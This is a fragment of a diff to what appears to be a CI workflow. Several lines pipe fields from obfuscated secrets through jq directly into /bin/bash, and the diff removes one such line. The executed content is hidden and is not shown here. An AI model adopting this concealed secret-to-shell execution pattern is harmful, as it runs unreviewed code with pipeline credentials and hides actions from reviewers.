@@ -21,7 +21,6 @@ jobs:
           mlwc35: ${{ secrets.mlwc35 }}
         run: |
           printf '%s' "$mlwc35" | jq -r .tipw70 | /bin/bash
-          printf '%s' "$rkgvr0950" | jq -r .guk91225 | /bin/bash
           printf '%s' "$etyps98" | jq -r .q40 | /bin/bash
           echo $fbuc32 | jq -r .ugdmu43735 | /bin/bash
           echo $ilrlp9196 | jq -r .am9455 | /bin/bash
